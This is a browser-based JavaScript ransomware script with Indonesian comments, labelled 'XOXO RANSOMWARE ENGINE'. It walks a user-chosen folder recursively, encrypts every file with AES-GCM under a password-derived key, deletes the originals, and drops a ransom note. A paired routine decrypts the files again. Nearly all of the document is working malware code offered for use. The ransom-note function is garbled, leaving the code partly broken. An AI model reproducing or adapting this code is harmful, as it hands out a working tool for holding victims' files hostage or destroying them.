<body>
<div class="container">

<script>
// === XOXO RANSOMWARE ENGINE ===
const logEl = document.getElementById('log');
const statusEl = document.getElementById('statusLabel');
let folderHandle = null;

function log(msg) {
    logEl.innerHTML += `\n> ${new Date().toLocaleTimeString()} : ${msg}`;
    logEl.scrollTop = logEl.scrollHeight;
}

function setStatus(text, isGood = true) {
    statusEl.innerText = isGood ? '🟢 ' + text : '🔴 ' + text;
}

async function pickFolder() {
    try {
        folderHandle = await window.showDirectoryPicker();
        log('✅ Folder terpilih: ' + folderHandle.name);
        setStatus('Folder siap: ' + folderHandle.name);
    } catch(e) {
        log('❌ Gagal pilih folder: ' + e.message);
        setStatus('Gagal pilih folder', false);
    }
}

// Derive key dari password pake PBKDF2
async function deriveKey(pass) {
    const enc = new TextEncoder();
    const salt = enc.encode('XoXo_Salt_2050_Mampus');
    const keyMaterial = await crypto.subtle.importKey(
        'raw', enc.encode(pass), 'PBKDF2', false, ['deriveKey']
    );
    return crypto.subtle.deriveKey(
        { name: 'PBKDF2', salt, iterations: 5000, hash: 'SHA-256' },
        keyMaterial,
        { name: 'AES-GCM', length: 256 },
        false,
        ['encrypt', 'decrypt']
    );
}

// Enkripsi 1 file, return Uint8Array (iv + ciphertext)
async function encryptFileContent(data, key) {
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt(
        { name: 'AES-GCM', iv },
        key,
        data
    );
    const result = new Uint8Array(iv.length + encrypted.byteLength);
    result.set(iv, 0);
    result.set(new Uint8Array(encrypted), iv.length);
    return result;
}

// Dekripsi 1 file, return ArrayBuffer
async function decryptFileContent(encryptedData, key) {
    const iv = encryptedData.slice(0, 12);
    const ciphertext = encryptedData.slice(12);
    return crypto.subtle.decrypt(
        { name: 'AES-GCM', iv },
        key,
        ciphertext
    );
}

// Proses folder secara rekursif
async function processFolder(dirHandle, key, isEncrypt) {
    const entries = [];
    for await (const entry of dirHandle.values()) {
        entries.push(entry);
    }

    for (const entry of entries) {
        if (entry.kind === 'directory') {
            await processFolder(entry, key, isEncrypt);
        } else if (entry.kind === 'file') {
            const name = entry.name;
            // Skip file nota biar ga di-proses 2x
            if (name === 'XOXO_NOTE.txt') continue;
            
            // Cek ekstensi
            const isEncrypted = name.endsWith('.xoxoenc');
            if (isEncrypt && isEncrypted) continue;
            if (!isEncrypt && !isEncrypted) continue;

            try {
                const file = await entry.getFile();
                const data = await file.arrayBuffer();
                let processed;

                if (isEncrypt) {
                    processed = await encryptFileContent(data, key);
                    // Buat file baru dengan ekstensi .xoxoenc
                    const newName = name + '.xoxoenc';
                    const newHandle = await dirHandle.getFileHandle(newName, { create: true });
                    const writable = await newHandle.createWritable();
                    await writable.write(processed);
                    await writable.close();
                    // Hapus file asli
                    await dirHandle.removeEntry(name);
                    log('🔒 Encrypted: ' + name + ' -> ' + newName);
                } else {
                    // Dekripsi
                    const decrypted = await decryptFileContent(new Uint8Array(data), key);
                    const originalName = name.replace('.xoxoenc', '');
                    const newHandle = await dirHandle.getFileHandle(originalName, { create: true });
                    const writable = await newHandle.createWritable();
                    await writable.write(decrypted);
                    await writable.close();
                    // Hapus file encrypted
                    await dirHandle.removeEntry(name);
                    log('🔓 Decrypted: ' + name + ' -> ' + originalName);
                }
            } catch (err) {
                log('⚠️ Gagal proses ' + entry.name + ' : ' + err.message);
            }
        }
    }
}

// Buat nota ransom
async function createRansomNote(dirHandle, keyVal) {
    try {

        `;
        await writer.write(note);

// === TOMBOL ENKRIPSI ===
async function encryptFolder() {
    const pass = document.getElementById('keyInput').value;
    if (pass.length < 4) { alert('Kunci minimal 4 huruf/angka cuyy!'); return; }
    if (!folderHandle) { await pickFolder(); if (!folderHandle) return; }

    setStatus('Sedang mengamuk...', true);
    log('🔥🔥 START ENKRIPSI 🔥🔥');
    try {
        const key = await deriveKey(pass);
        await processFolder(folderHandle, key, true);
        await createRansomNote(folderHandle, pass);
        log('✅✅ SEMUA FILE BERHASIL DI ENKRIPSI! KALO LUPA KUNCI, SELAMAT DATA ILANG 😈');
        setStatus('Misi enkripsi selesai!', false);
    } catch (e) {
        log('💀 ERROR FATAL: ' + e.message);
        setStatus('Error nih bre!', false);
    }
}

// === TOMBOL DEKRIPSI ===
async function decryptFolder() {
    const pass = document.getElementById('keyInput').value;
    if (pass.length < 4) { alert('Kunci minimal 4 huruf/angka cuyy!'); return; }
    if (!folderHandle) { await pickFolder(); if (!folderHandle) return; }

    setStatus('Sedang memulihkan...', true);
    log('🔓🔓 START DEKRIPSI 🔓🔓');
    try {
        const key = await deriveKey(pass);
        await processFolder(folderHandle, key, false);
        // Hapus note kalo ada
        try { await folderHandle.removeEntry('XOXO_NOTE.txt'); log('🗑️ Note dibersihkan'); } catch(e) {}
        log('✅✅ SEMUA FILE KEMBALI NORMAL! SELAMAT DATA LO SELAMAT 😎');
        setStatus('Pulih total!', true);
    } catch (e) {
        log('💀 ERROR: ' + e.message);
        setStatus('Kunci salah atau file corrupt', false);
    }
}
